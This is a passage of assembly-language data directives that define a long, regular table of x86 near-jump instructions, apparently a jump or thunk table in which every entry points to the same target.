    db 0E9h,1Ah,9Dh,00h,00h,0E9h,15h,9Dh,00h,00h,0E9h,10h,9Dh,00h,00h,0E9h
    db 0Bh,9Dh,00h,00h,0E9h,06h,9Dh,00h,00h,0E9h,01h,9Dh,00h,00h,0E9h,0FCh
    db 9Ch,00h,00h,0E9h,0F7h,9Ch,00h,00h,0E9h,0F2h,9Ch,00h,00h,0E9h,0EDh,9Ch
    db 00h,00h,0E9h,0E8h,9Ch,00h,00h,0E9h,0E3h,9Ch,00h,00h,0E9h,0DEh,9Ch,00h
    db 00h,0E9h,0D9h,9Ch,00h,00h,0E9h,0D4h,9Ch,00h,00h,0E9h,0CFh,9Ch,00h,00h
    db 0E9h,0CAh,9Ch,00h,00h,0E9h,0C5h,9Ch,00h,00h,0E9h,0C0h,9Ch,00h,00h,0E9h
    db 0BBh,9Ch,00h,00h,0E9h,0B6h,9Ch,00h,00h,0E9h,0B1h,9Ch,00h,00h,0E9h,0ACh
    db 9Ch,00h,00h,0E9h,0A7h,9Ch,00h,00h,0E9h,0A2h,9Ch,00h,00h,0E9h,9Dh,9Ch
    db 00h,00h,0E9h,98h,9Ch,00h,00h,0E9h,93h,9Ch,00h,00h,0E9h,8Eh,9Ch,00h
    db 00h,0E9h,89h,9Ch,00h,00h,0E9h,84h,9Ch,00h,00h,0E9h,7Fh,9Ch,00h,00h
    db 0E9h,7Ah,9Ch,00h,00h,0E9h,75h,9Ch,00h,00h,0E9h,70h,9Ch,00h,00h,0E9h
    db 6Bh,9Ch,00h,00h,0E9h,66h,9Ch,00h,00h,0E9h,61h,9Ch,00h,00h,0E9h,5Ch
    db 9Ch,00h,00h,0E9h,57h,9Ch,00h,00h,0E9h,52h,9Ch,00h,00h,0E9h,4Dh,9Ch
    db 00h,00h,0E9h,48h,9Ch,00h,00h,0E9h,43h,9Ch,00h,00h,0E9h,3Eh,9Ch,00h
    db 00h,0E9h,39h,9Ch,00h,00h,0E9h,34h,9Ch,00h,00h,0E9h,2Fh,9Ch,00h,00h
    db 0E9h,2Ah,9Ch,00h,00h,0E9h,25h,9Ch,00h,00h,0E9h,20h,9Ch,00h,00h,0E9h
    db 1Bh,9Ch,00h,00h,0E9h,16h,9Ch,00h,00h,0E9h,11h,9Ch,00h,00h,0E9h,0Ch
    db 9Ch,00h,00h,0E9h,07h,9Ch,00h,00h,0E9h,02h,9Ch,00h,00h,0E9h,0FDh,9Bh
    db 00h,00h,0E9h,0F8h,9Bh,00h,00h,0E9h,0F3h,9Bh,00h,00h,0E9h,0EEh,9Bh,00h
    db 00h,0E9h,0E9h,9Bh,00h,00h,0E9h,0E4h,9Bh,00h,00h,0E9h,0DFh,9Bh,00h,00h
    db 0E9h,0DAh,9Bh,00h,00h,0E9h,0D5h,9Bh,00h,00h,0E9h,0D0h,9Bh,00h,00h,0E9h
    db 0CBh,9Bh,00h,00h,0E9h,0C6h,9Bh,00h,00h,0E9h,0C1h,9Bh,00h,00h,0E9h,0BCh
    db 9Bh,00h,00h,0E9h,0B7h,9Bh,00h,00h,0E9h,0B2h,9Bh,00h,00h,0E9h,0ADh,9Bh
    db 00h,00h,0E9h,0A8h,9Bh,00h,00h,0E9h,0A3h,9Bh,00h,00h,0E9h,9Eh,9Bh,00h
    db 00h,0E9h,99h,9Bh,00h,00h,0E9h,94h,9Bh,00h,00h,0E9h,8Fh,9Bh,00h,00h
    db 0E9h,8Ah,9Bh,00h,00h,0E9h,85h,9Bh,00h,00h,0E9h,80h,9Bh,00h,00h,0E9h
    db 7Bh,9Bh,00h,00h,0E9h,76h,9Bh,00h,00h,0E9h,71h,9Bh,00h,00h,0E9h,6Ch
    db 9Bh,00h,00h,0E9h,67h,9Bh,00h,00h,0E9h,62h,9Bh,00h,00h,0E9h,5Dh,9Bh
    db 00h,00h,0E9h,58h,9Bh,00h,00h,0E9h,53h,9Bh,00h,00h,0E9h,4Eh,9Bh,00h
    db 00h,0E9h,49h,9Bh,00h,00h,0E9h,44h,9Bh,00h,00h,0E9h,3Fh,9Bh,00h,00h
    db 0E9h,3Ah,9Bh,00h,00h,0E9h,35h,9Bh,00h,00h,0E9h,30h,9Bh,00h,00h,0E9h
    db 2Bh,9Bh,00h,00h,0E9h,26h,9Bh,00h,00h,0E9h,21h,9Bh,00h,00h,0E9h,1Ch
    db 9Bh,00h,00h,0E9h,17h,9Bh,00h,00h,0E9h,12h,9Bh,00h,00h,0E9h,0Dh,9Bh
    db 00h,00h,0E9h,08h,9Bh,00h,00h,0E9h,03h,9Bh,00h,00h,0E9h,0FEh,9Ah,00h
    db 00h,0E9h,0F9h,9Ah,00h,00h,0E9h,0F4h,9Ah,00h,00h,0E9h,0EFh,9Ah,00h,00h
    db 0E9h,0EAh,9Ah,00h,00h,0E9h,0E5h,9Ah,00h,00h,0E9h,0E0h,9Ah,00h,00h,0E9h
    db 0DBh,9Ah,00h,00h,0E9h,0D6h,9Ah,00h,00h,0E9h,0D1h,9Ah,00h,00h,0E9h,0CCh
    db 9Ah,00h,00h,0E9h,0C7h,9Ah,00h,00h,0E9h,0C2h,9Ah,00h,00h,0E9h,0BDh,9Ah
    db 00h,00h,0E9h,0B8h,9Ah,00h,00h,0E9h,0B3h,9Ah,00h,00h,0E9h,0AEh,9Ah,00h
    db 00h,0E9h,0A9h,9Ah,00h,00h,0E9h,0A4h,9Ah,00h,00h,0E9h,9Fh,9Ah,00h,00h
    db 0E9h,9Ah,9Ah,00h,00h,0E9h,95h,9Ah,00h,00h,0E9h,90h,9Ah,00h,00h,0E9h
    db 8Bh,9Ah,00h,00h,0E9h,86h,9Ah,00h,00h,0E9h,81h,9Ah,00h,00h,0E9h,7Ch
    db 9Ah,00h,00h,0E9h,77h,9Ah,00h,00h,0E9h,72h,9Ah,00h,00h,0E9h,6Dh,9Ah
    db 00h,00h,0E9h,68h,9Ah,00h,00h,0E9h,63h,9Ah,00h,00h,0E9h,5Eh,9Ah,00h
    db 00h,0E9h,59h,9Ah,00h,00h,0E9h,54h,9Ah,00h,00h,0E9h,4Fh,9Ah,00h,00h
    db 0E9h,4Ah,9Ah,00h,00h,0E9h,45h,9Ah,00h,00h,0E9h,40h,9Ah,00h,00h,0E9h
    db 3Bh,9Ah,00h,00h,0E9h,36h,9Ah,00h,00h,0E9h,31h,9Ah,00h,00h,0E9h,2Ch
    db 9Ah,00h,00h,0E9h,27h,9Ah,00h,00h,0E9h,22h,9Ah,00h,00h,0E9h,1Dh,9Ah
    db 00h,00h,0E9h,18h,9Ah,00h,00h,0E9h,13h,9Ah,00h,00h,0E9h,0Eh,9Ah,00h
    db 00h,0E9h,09h,9Ah,00h,00h,0E9h,04h,9Ah,00h,00h,0E9h,0FFh,99h,00h,00h
    db 0E9h,0FAh,99h,00h,00h,0E9h,0F5h,99h,00h,00h,0E9h,0F0h,99h,00h,00h,0E9h
    db 0EBh,99h,00h,00h,0E9h,0E6h,99h,00h,00h,0E9h,0E1h,99h,00h,00h,0E9h,0DCh
    db 99h,00h,00h,0E9h,0D7h,99h,00h,00h,0E9h,0D2h,99h,00h,00h,0E9h,0CDh,99h
    db 00h,00h,0E9h,0C8h,99h,00h,00h,0E9h,0C3h,99h,00h,00h,0E9h,0BEh,99h,00h
    db 00h,0E9h,0B9h,99h,00h,00h,0E9h,0B4h,99h,00h,00h,0E9h,0AFh,99h,00h,00h
    db 0E9h,0AAh,99h,00h,00h,0E9h,0A5h,99h,00h,00h,0E9h,0A0h,99h,00h,00h,0E9h
    db 9Bh,99h,00h,00h,0E9h,96h,99h,00h,00h,0E9h,91h,99h,00h,00h,0E9h,8Ch
    db 99h,00h,00h,0E9h,87h,99h,00h,00h,0E9h,82h,99h,00h,00h,0E9h,7Dh,99h
    db 00h,00h,0E9h,78h,99h,00h,00h,0E9h,73h,99h,00h,00h,0E9h,6Eh,99h,00h
    db 00h,0E9h,69h,99h,00h,00h,0E9h,64h,99h,00h,00h,0E9h,5Fh,99h,00h,00h
    db 0E9h,5Ah,99h,00h,00h,0E9h,55h,99h,00h,00h,0E9h,50h,99h,00h,00h,0E9h
    db 4Bh,99h,00h,00h,0E9h,46h,99h,00h,00h,0E9h,41h,99h,00h,00h,0E9h,3Ch
    db 99h,00h,00h,0E9h,37h,99h,00h,00h,0E9h,32h,99h,00h,00h,0E9h,2Dh,99h
    db 00h,00h,0E9h,28h,99h,00h,00h,0E9h,23h,99h,00h,00h,0E9h,1Eh,99h,00h
    db 00h,0E9h,19h,99h,00h,00h,0E9h,14h,99h,00h,00h,0E9h,0Fh,99h,00h,00h
    db 0E9h,0Ah,99h,00h,00h,0E9h,05h,99h,00h,00h,0E9h,00h,99h,00h,00h,0E9h
    db 0FBh,98h,00h,00h,0E9h,0F6h,98h,00h,00h,0E9h,0F1h,98h,00h,00h,0E9h,0ECh
    db 98h,00h,00h,0E9h,0E7h,98h,00h,00h,0E9h,0E2h,98h,00h,00h,0E9h,0DDh,98h
    db 00h,00h,0E9h,0D8h,98h,00h,00h,0E9h,0D3h,98h,00h,00h,0E9h,0CEh,98h,00h
    db 00h,0E9h,0C9h,98h,00h,00h,0E9h,0C4h,98h,00h,00h,0E9h,0BFh,98h,00h,00h
    db 0E9h,0BAh,98h,00h,00h,0E9h,0B5h,98h,00h,00h,0E9h,0B0h,98h,00h,00h,0E9h
    db 0ABh,98h,00h,00h,0E9h,0A6h,98h,00h,00h,0E9h,0A1h,98h,00h,00h,0E9h,9Ch
    db 98h,00h,00h,0E9h,97h,98h,00h,00h,0E9h,92h,98h,00h,00h,0E9h,8Dh,98h
    db 00h,00h,0E9h,88h,98h,00h,00h,0E9h,83h,98h,00h,00h,0E9h,7Eh,98h,00h
    db 00h,0E9h,79h,98h,00h,00h,0E9h,74h,98h,00h,00h,0E9h,6Fh,98h,00h,00h
    db 0E9h,6Ah,98h,00h,00h,0E9h,65h,98h,00h,00h,0E9h,60h,98h,00h,00h,0E9h
    db 5Bh,98h,00h,00h,0E9h,56h,98h,00h,00h,0E9h,51h,98h,00h,00h,0E9h,4Ch
    db 98h,00h,00h,0E9h,47h,98h,00h,00h,0E9h,42h,98h,00h,00h,0E9h,3Dh,98h
    db 00h,00h,0E9h,38h,98h,00h,00h,0E9h,33h,98h,00h,00h,0E9h,2Eh,98h,00h
    db 00h,0E9h,29h,98h,00h,00h,0E9h,24h,98h,00h,00h,0E9h,1Fh,98h,00h,00h
    db 0E9h,1Ah,98h,00h,00h,0E9h,15h,98h,00h,00h,0E9h,10h,98h,00h,00h,0E9h
    db 0Bh,98h,00h,00h,0E9h,06h,98h,00h,00h,0E9h,01h,98h,00h,00h,0E9h,0FCh
    db 97h,00h,00h,0E9h,0F7h,97h,00h,00h,0E9h,0F2h,97h,00h,00h,0E9h,0EDh,97h
    db 00h,00h,0E9h,0E8h,97h,00h,00h,0E9h,0E3h,97h,00h,00h,0E9h,0DEh,97h,00h
    db 00h,0E9h,0D9h,97h,00h,00h,0E9h,0D4h,97h,00h,00h,0E9h,0CFh,97h,00h,00h
    db 0E9h,0CAh,97h,00h,00h,0E9h,0C5h,97h,00h,00h,0E9h,0C0h,97h,00h,00h,0E9h
    db 0BBh,97h,00h,00h,0E9h,0B6h,97h,00h,00h,0E9h,0B1h,97h,00h,00h,0E9h,0ACh
    db 97h,00h,00h,0E9h,0A7h,97h,00h,00h,0E9h,0A2h,97h,00h,00h,0E9h,9Dh,97h
    db 00h,00h,0E9h,98h,97h,00h,00h,0E9h,93h,97h,00h,00h,0E9h,8Eh,97h,00h
    db 00h,0E9h,89h,97h,00h,00h,0E9h,84h,97h,00h,00h,0E9h,7Fh,97h,00h,00h
    db 0E9h,7Ah,97h,00h,00h,0E9h,75h,97h,00h,00h,0E9h,70h,97h,00h,00h,0E9h
    db 6Bh,97h,00h,00h,0E9h,66h,97h,00h,00h,0E9h,61h,97h,00h,00h,0E9h,5Ch
    db 97h,00h,00h,0E9h,57h,97h,00h,00h,0E9h,52h,97h,00h,00h,0E9h,4Dh,97h
    db 00h,00h,0E9h,48h,97h,00h,00h,0E9h,43h,97h,00h,00h,0E9h,3Eh,97h,00h
    db 00h,0E9h,39h,97h,00h,00h,0E9h,34h,97h,00h,00h,0E9h,2Fh,97h,00h,00h
    db 0E9h,2Ah,97h,00h,00h,0E9h,25h,97h,00h,00h,0E9h,20h,97h,00h,00h,0E9h
    db 1Bh,97h,00h,00h,0E9h,16h,97h,00h,00h,0E9h,11h,97h,00h,00h,0E9h,0Ch
    db 97h,00h,00h,0E9h,07h,97h,00h,00h,0E9h,02h,97h,00h,00h,0E9h,0FDh,96h
    db 00h,00h,0E9h,0F8h,96h,00h,00h,0E9h,0F3h,96h,00h,00h,0E9h,0EEh,96h,00h
    db 00h,0E9h,0E9h,96h,00h,00h,0E9h,0E4h,96h,00h,00h,0E9h,0DFh,96h,00h,00h
    db 0E9h,0DAh,96h,00h,00h,0E9h,0D5h,96h,00h,00h,0E9h,0D0h,96h,00h,00h,0E9h
    db 0CBh,96h,00h,00h,0E9h,0C6h,96h,00h,00h,0E9h,0C1h,96h,00h,00h,0E9h,0BCh
    db 96h,00h,00h,0E9h,0B7h,96h,00h,00h,0E9h,0B2h,96h,00h,00h,0E9h,0ADh,96h
    db 00h,00h,0E9h,0A8h,96h,00h,00h,0E9h,0A3h,96h,00h,00h,0E9h,9Eh,96h,00h
    db 00h,0E9h,99h,96h,00h,00h,0E9h,94h,96h,00h,00h,0E9h,8Fh,96h,00h,00h
    db 0E9h,8Ah,96h,00h,00h,0E9h,85h,96h,00h,00h,0E9h,80h,96h,00h,00h,0E9h
    db 7Bh,96h,00h,00h,0E9h,76h,96h,00h,00h,0E9h,71h,96h,00h,00h,0E9h,6Ch
    db 96h,00h,00h,0E9h,67h,96h,00h,00h,0E9h,62h,96h,00h,00h,0E9h,5Dh,96h
    db 00h,00h,0E9h,58h,96h,00h,00h,0E9h,53h,96h,00h,00h,0E9h,4Eh,96h,00h
    db 00h,0E9h,49h,96h,00h,00h,0E9h,44h,96h,00h,00h,0E9h,3Fh,96h,00h,00h
    db 0E9h,3Ah,96h,00h,00h,0E9h,35h,96h,00h,00h,0E9h,30h,96h,00h,00h,0E9h
    db 2Bh,96h,00h,00h,0E9h,26h,96h,00h,00h,0E9h,21h,96h,00h,00h,0E9h,1Ch
    db 96h,00h,00h,0E9h,17h,96h,00h,00h,0E9h,12h,96h,00h,00h,0E9h,0Dh,96h
    db 00h,00h,0E9h,08h,96h,00h,00h,0E9h,03h,96h,00h,00h,0E9h,0FEh,95h,00h
    db 00h,0E9h,0F9h,95h,00h,00h,0E9h,0F4h,95h,00h,00h,0E9h,0EFh,95h,00h,00h
    db 0E9h,0EAh,95h,00h,00h,0E9h,0E5h,95h,00h,00h,0E9h,0E0h,95h,00h,00h,0E9h
    db 0DBh,95h,00h,00h,0E9h,0D6h,95h,00h,00h,0E9h,0D1h,95h,00h,00h,0E9h,0CCh
    db 95h,00h,00h,0E9h,0C7h,95h,00h,00h,0E9h,0C2h,95h,00h,00h,0E9h,0BDh,95h
    db 00h,00h,0E9h,0B8h,95h,00h,00h,0E9h,0B3h,95h,00h,00h,0E9h,0AEh,95h,00h
    db 00h,0E9h,0A9h,95h,00h,00h,0E9h,0A4h,95h,00h,00h,0E9h,9Fh,95h,00h,00h
    db 0E9h,9Ah,95h,00h,00h,0E9h,95h,95h,00h,00h,0E9h,90h,95h,00h,00h,0E9h
    db 8Bh,95h,00h,00h,0E9h,86h,95h,00h,00h,0E9h,81h,95h,00h,00h,0E9h,7Ch
    db 95h,00h,00h,0E9h,77h,95h,00h,00h,0E9h,72h,95h,00h,00h,0E9h,6Dh,95h
    db 00h,00h,0E9h,68h,95h,00h,00h,0E9h,63h,95h,00h,00h,0E9h,5Eh,95h,00h
    db 00h,0E9h,59h,95h,00h,00h,0E9h,54h,95h,00h,00h,0E9h,4Fh,95h,00h,00h
    db 0E9h,4Ah,95h,00h,00h,0E9h,45h,95h,00h,00h,0E9h,40h,95h,00h,00h,0E9h
    db 3Bh,95h,00h,00h,0E9h,36h,95h,00h,00h,0E9h,31h,95h,00h,00h,0E9h,2Ch
    db 95h,00h,00h,0E9h,27h,95h,00h,00h,0E9h,22h,95h,00h,00h,0E9h,1Dh,95h
    db 00h,00h,0E9h,18h,95h,00h,00h,0E9h,13h,95h,00h,00h,0E9h,0Eh,95h,00h
    db 00h,0E9h,09h,95h,00h,00h,0E9h,04h,95h,00h,00h,0E9h,0FFh,94h,00h,00h
    db 0E9h,0FAh,94h,00h,00h,0E9h,0F5h,94h,00h,00h,0E9h,0F0h,94h,00h,00h,0E9h
    db 0EBh,94h,00h,00h,0E9h,0E6h,94h,00h,00h,0E9h,0E1h,94h,00h,00h,0E9h,0DCh
    db 94h,00h,00h,0E9h,0D7h,94h,00h,00h,0E9h,0D2h,94h,00h,00h,0E9h,0CDh,94h
    db 00h,00h,0E9h,0C8h,94h,00h,00h,0E9h,0C3h,94h,00h,00h,0E9h,0BEh,94h,00h
    db 00h,0E9h,0B9h,94h,00h,00h,0E9h,0B4h,94h,00h,00h,0E9h,0AFh,94h,00h,00h
    db 0E9h,0AAh,94h,00h,00h,0E9h,0A5h,94h,00h,00h,0E9h,0A0h,94h,00h,00h,0E9h
    db 9Bh,94h,00h,00h,0E9h,96h,94h,00h,00h,0E9h,91h,94h,00h,00h,0E9h,8Ch
    db 94h,00h,00h,0E9h,87h,94h,00h,00h,0E9h,82h,94h,00h,00h,0E9h,7Dh,94h
    db 00h,00h,0E9h,78h,94h,00h,00h,0E9h,73h,94h,00h,00h,0E9h,6Eh,94h,00h
    db 00h,0E9h,69h,94h,00h,00h,0E9h,64h,94h,00h,00h,0E9h,5Fh,94h,00h,00h
    db 0E9h,5Ah,94h,00h,00h,0E9h,55h,94h,00h,00h,0E9h,50h,94h,00h,00h,0E9h
    db 4Bh,94h,00h,00h,0E9h,46h,94h,00h,00h,0E9h,41h,94h,00h,00h,0E9h,3Ch
    db 94h,00h,00h,0E9h,37h,94h,00h,00h,0E9h,32h,94h,00h,00h,0E9h,2Dh,94h
    db 00h,00h,0E9h,28h,94h,00h,00h,0E9h,23h,94h,00h,00h,0E9h,1Eh,94h,00h
    db 00h,0E9h,19h,94h,00h,00h,0E9h,14h,94h,00h,00h,0E9h,0Fh,94h,00h,00h
    db 0E9h,0Ah,94h,00h,00h,0E9h,05h,94h,00h,00h,0E9h,00h,94h,00h,00h,0E9h
    db 0FBh,93h,00h,00h,0E9h,0F6h,93h,00h,00h,0E9h,0F1h,93h,00h,00h,0E9h,0ECh
    db 93h,00h,00h,0E9h,0E7h,93h,00h,00h,0E9h,0E2h,93h,00h,00h,0E9h,0DDh,93h
    db 00h,00h,0E9h,0D8h,93h,00h,00h,0E9h,0D3h,93h,00h,00h,0E9h,0CEh,93h,00h
    db 00h,0E9h,0C9h,93h,00h,00h,0E9h,0C4h,93h,00h,00h,0E9h,0BFh,93h,00h,00h
    db 0E9h,0BAh,93h,00h,00h,0E9h,0B5h,93h,00h,00h,0E9h,0B0h,93h,00h,00h,0E9h
    db 0ABh,93h,00h,00h,0E9h,0A6h,93h,00h,00h,0E9h,0A1h,93h,00h,00h,0E9h,9Ch
    db 93h,00h,00h,0E9h,97h,93h,00h,00h,0E9h,92h,93h,00h,00h,0E9h,8Dh,93h
    db 00h,00h,0E9h,88h,93h,00h,00h,0E9h,83h,93h,00h,00h,0E9h,7Eh,93h,00h
    db 00h,0E9h,79h,93h,00h,00h,0E9h,74h,93h,00h,00h,0E9h,6Fh,93h,00h,00h
    db 0E9h,6Ah,93h,00h,00h,0E9h,65h,93h,00h,00h,0E9h,60h,93h,00h,00h,0E9h
    db 5Bh,93h,00h,00h,0E9h,56h,93h,00h,00h,0E9h,51h,93h,00h,00h,0E9h,4Ch
    db 93h,00h,00h,0E9h,47h,93h,00h,00h,0E9h,42h,93h,00h,00h,0E9h,3Dh,93h
    db 00h,00h,0E9h,38h,93h,00h,00h,0E9h,33h,93h,00h,00h,0E9h,2Eh,93h,00h
    db 00h,0E9h,29h,93h,00h,00h,0E9h,24h,93h,00h,00h,0E9h,1Fh,93h,00h,00h
    db 0E9h,1Ah,93h,00h,00h,0E9h,15h,93h,00h,00h,0E9h,10h,93h,00h,00h,0E9h
    db 0Bh,93h,00h,00h,0E9h,06h,93h,00h,00h,0E9h,01h,93h,00h,00h,0E9h,0FCh
    db 92h,00h,00h,0E9h,0F7h,92h,00h,00h,0E9h,0F2h,92h,00h,00h,0E9h,0EDh,92h
    db 00h,00h,0E9h,0E8h,92h,00h,00h,0E9h,0E3h,92h,00h,00h,0E9h,0DEh,92h,00h
    db 00h,0E9h,0D9h,92h,00h,00h,0E9h,0D4h,92h,00h,00h,0E9h,0CFh,92h,00h,00h
    db 0E9h,0CAh,92h,00h,00h,0E9h,0C5h,92h,00h,00h,0E9h,0C0h,92h,00h,00h,0E9h
    db 0BBh,92h,00h,00h,0E9h,0B6h,92h,00h,00h,0E9h,0B1h,92h,00h,00h,0E9h,0ACh
    db 92h,00h,00h,0E9h,0A7h,92h,00h,00h,0E9h,0A2h,92h,00h,00h,0E9h,9Dh,92h
    db 00h,00h,0E9h,98h,92h,00h,00h,0E9h,93h,92h,00h,00h,0E9h,8Eh,92h,00h
    db 00h,0E9h,89h,92h,00h,00h,0E9h,84h,92h,00h,00h,0E9h,7Fh,92h,00h,00h
    db 0E9h,7Ah,92h,00h,00h,0E9h,75h,92h,00h,00h,0E9h,70h,92h,00h,00h,0E9h
    db 6Bh,92h,00h,00h,0E9h,66h,92h,00h,00h,0E9h,61h,92h,00h,00h,0E9h,5Ch
    db 92h,00h,00h,0E9h,57h,92h,00h,00h,0E9h,52h,92h,00h,00h,0E9h,4Dh,92h
    db 00h,00h,0E9h,48h,92h,00h,00h,0E9h,43h,92h,00h,00h,0E9h,3Eh,92h,00h
    db 00h,0E9h,39h,92h,00h,00h,0E9h,34h,92h,00h,00h,0E9h,2Fh,92h,00h,00h
    db 0E9h,2Ah,92h,00h,00h,0E9h,25h,92h,00h,00h,0E9h,20h,92h,00h,00h,0E9h
    db 1Bh,92h,00h,00h,0E9h,16h,92h,00h,00h,0E9h,11h,92h,00h,00h,0E9h,0Ch
    db 92h,00h,00h,0E9h,07h,92h,00h,00h,0E9h,02h,92h,00h,00h,0E9h,0FDh,91h
    db 00h,00h,0E9h,0F8h,91h,00h,00h,0E9h,0F3h,91h,00h,00h,0E9h,0EEh,91h,00h
    db 00h,0E9h,0E9h,91h,00h,00h,0E9h,0E4h,91h,00h,00h,0E9h,0DFh,91h,00h,00h
    db 0E9h,0DAh,91h,00h,00h,0E9h,0D5h,91h,00h,00h,0E9h,0D0h,91h,00h,00h,0E9h
    db 0CBh,91h,00h,00h,0E9h,0C6h,91h,00h,00h,0E9h,0C1h,91h,00h,00h,0E9h,0BCh
    db 91h,00h,00h,0E9h,0B7h,91h,00h,00h,0E9h,0B2h,91h,00h,00h,0E9h,0ADh,91h
    db 00h,00h,0E9h,0A8h,91h,00h,00h,0E9h,0A3h,91h,00h,00h,0E9h,9Eh,91h,00h
    db 00h,0E9h,99h,91h,00h,00h,0E9h,94h,91h,00h,00h,0E9h,8Fh,91h,00h,00h
    db 0E9h,8Ah,91h,00h,00h,0E9h,85h,91h,00h,00h,0E9h,80h,91h,00h,00h,0E9h
    db 7Bh,91h,00h,00h,0E9h,76h,91h,00h,00h,0E9h,71h,91h,00h,00h,0E9h,6Ch
    db 91h,00h,00h,0E9h,67h,91h,00h,00h,0E9h,62h,91h,00h,00h,0E9h,5Dh,91h
    db 00h,00h,0E9h,58h,91h,00h,00h,0E9h,53h,91h,00h,00h,0E9h,4Eh,91h,00h
    db 00h,0E9h,49h,91h,00h,00h,0E9h,44h,91h,00h,00h,0E9h,3Fh,91h,00h,00h
    db 0E9h,3Ah,91h,00h,00h,0E9h,35h,91h,00h,00h,0E9h,30h,91h,00h,00h,0E9h
    db 2Bh,91h,00h,00h,0E9h,26h,91h,00h,00h,0E9h,21h,91h,00h,00h,0E9h,1Ch
    db 91h,00h,00h,0E9h,17h,91h,00h,00h,0E9h,12h,91h,00h,00h,0E9h,0Dh,91h
    db 00h,00h,0E9h,08h,91h,00h,00h,0E9h,03h,91h,00h,00h,0E9h,0FEh,90h,00h
    db 00h,0E9h,0F9h,90h,00h,00h,0E9h,0F4h,90h,00h,00h,0E9h,0EFh,90h,00h,00h
    db 0E9h,0EAh,90h,00h,00h,0E9h,0E5h,90h,00h,00h,0E9h,0E0h,90h,00h,00h,0E9h
    db 0DBh,90h,00h,00h,0E9h,0D6h,90h,00h,00h,0E9h,0D1h,90h,00h,00h,0E9h,0CCh
    db 90h,00h,00h,0E9h,0C7h,90h,00h,00h,0E9h,0C2h,90h,00h,00h,0E9h,0BDh,90h
    db 00h,00h,0E9h,0B8h,90h,00h,00h,0E9h,0B3h,90h,00h,00h,0E9h,0AEh,90h,00h
    db 00h,0E9h,0A9h,90h,00h,00h,0E9h,0A4h,90h,00h,00h,0E9h,9Fh,90h,00h,00h
    db 0E9h,9Ah,90h,00h,00h,0E9h,95h,90h,00h,00h,0E9h,90h,90h,00h,00h,0E9h
    db 8Bh,90h,00h,00h,0E9h,86h,90h,00h,00h,0E9h,81h,90h,00h,00h,0E9h,7Ch
    db 90h,00h,00h,0E9h,77h,90h,00h,00h,0E9h,72h,90h,00h,00h,0E9h,6Dh,90h
    db 00h,00h,0E9h,68h,90h,00h,00h,0E9h,63h,90h,00h,00h,0E9h,5Eh,90h,00h
    db 00h,0E9h,59h,90h,00h,00h,0E9h,54h,90h,00h,00h,0E9h,4Fh,90h,00h,00h
    db 0E9h,4Ah,90h,00h,00h,0E9h,45h,90h,00h,00h,0E9h,40h,90h,00h,00h,0E9h
    db 3Bh,90h,00h,00h,0E9h,36h,90h,00h,00h,0E9h,31h,90h,00h,00h,0E9h,2Ch
    db 90h,00h,00h,0E9h,27h,90h,00h,00h,0E9h,22h,90h,00h,00h,0E9h,1Dh,90h
    db 00h,00h,0E9h,18h,90h,00h,00h,0E9h,13h,90h,00h,00h,0E9h,0Eh,90h,00h
    db 00h,0E9h,09h,90h,00h,00h,0E9h,04h,90h,00h,00h,0E9h,0FFh,8Fh,00h,00h
    db 0E9h,0FAh,8Fh,00h,00h,0E9h,0F5h,8Fh,00h,00h,0E9h,0F0h,8Fh,00h,00h,0E9h
    db 0EBh,8Fh,00h,00h,0E9h,0E6h,8Fh,00h,00h,0E9h,0E1h,8Fh,00h,00h,0E9h,0DCh
    db 8Fh,00h,00h,0E9h,0D7h,8Fh,00h,00h,0E9h,0D2h,8Fh,00h,00h,0E9h,0CDh,8Fh
    db 00h,00h,0E9h,0C8h,8Fh,00h,00h,0E9h,0C3h,8Fh,00h,00h,0E9h,0BEh,8Fh,00h
    db 00h,0E9h,0B9h,8Fh,00h,00h,0E9h,0B4h,8Fh,00h,00h,0E9h,0AFh,8Fh,00h,00h
    db 0E9h,0AAh,8Fh,00h,00h,0E9h,0A5h,8Fh,00h,00h,0E9h,0A0h,8Fh,00h,00h,0E9h
    db 9Bh,8Fh,00h,00h,0E9h,96h,8Fh,00h,00h,0E9h,91h,8Fh,00h,00h,0E9h,8Ch
    db 8Fh,00h,00h,0E9h,87h,8Fh,00h,00h,0E9h,82h,8Fh,00h,00h,0E9h,7Dh,8Fh
    db 00h,00h,0E9h,78h,8Fh,00h,00h,0E9h,73h,8Fh,00h,00h,0E9h,6Eh,8Fh,00h
    db 00h,0E9h,69h,8Fh,00h,00h,0E9h,64h,8Fh,00h,00h,0E9h,5Fh,8Fh,00h,00h
    db 0E9h,5Ah,8Fh,00h,00h,0E9h,55h,8Fh,00h,00h,0E9h,50h,8Fh,00h,00h,0E9h
    db 4Bh,8Fh,00h,00h,0E9h,46h,8Fh,00h,00h,0E9h,41h,8Fh,00h,00h,0E9h,3Ch
    db 8Fh,00h,00h,0E9h,37h,8Fh,00h,00h,0E9h,32h,8Fh,00h,00h,0E9h,2Dh,8Fh
    db 00h,00h,0E9h,28h,8Fh,00h,00h,0E9h,23h,8Fh,00h,00h,0E9h,1Eh,8Fh,00h
    db 00h,0E9h,19h,8Fh,00h,00h,0E9h,14h,8Fh,00h,00h,0E9h,0Fh,8Fh,00h,00h
    db 0E9h,0Ah,8Fh,00h,00h,0E9h,05h,8Fh,00h,00h,0E9h,00h,8Fh,00h,00h,0E9h
    db 0FBh,8Eh,00h,00h,0E9h,0F6h,8Eh,00h,00h,0E9h,0F1h,8Eh,00h,00h,0E9h,0ECh
    db 8Eh,00h,00h,0E9h,0E7h,8Eh,00h,00h,0E9h,0E2h,8Eh,00h,00h,0E9h,0DDh,8Eh
    db 00h,00h,0E9h,0D8h,8Eh,00h,00h,0E9h,0D3h,8Eh,00h,00h,0E9h,0CEh,8Eh,00h
    db 00h,0E9h,0C9h,8Eh,00h,00h,0E9h,0C4h,8Eh,00h,00h,0E9h,0BFh,8Eh,00h,00h
    db 0E9h,0BAh,8Eh,00h,00h,0E9h,0B5h,8Eh,00h,00h,0E9h,0B0h,8Eh,00h,00h,0E9h
    db 0ABh,8Eh,00h,00h,0E9h,0A6h,8Eh,00h,00h,0E9h,0A1h,8Eh,00h,00h,0E9h,9Ch
    db 8Eh,00h,00h,0E9h,97h,8Eh,00h,00h,0E9h,92h,8Eh,00h,00h,0E9h,8Dh,8Eh
    db 00h,00h,0E9h,88h,8Eh,00h,00h,0E9h,83h,8Eh,00h,00h,0E9h,7Eh,8Eh,00h
    db 00h,0E9h,79h,8Eh,00h,00h,0E9h,74h,8Eh,00h,00h,0E9h,6Fh,8Eh,00h,00h
    db 0E9h,6Ah,8Eh,00h,00h,0E9h,65h,8Eh,00h,00h,0E9h,60h,8Eh,00h,00h,0E9h
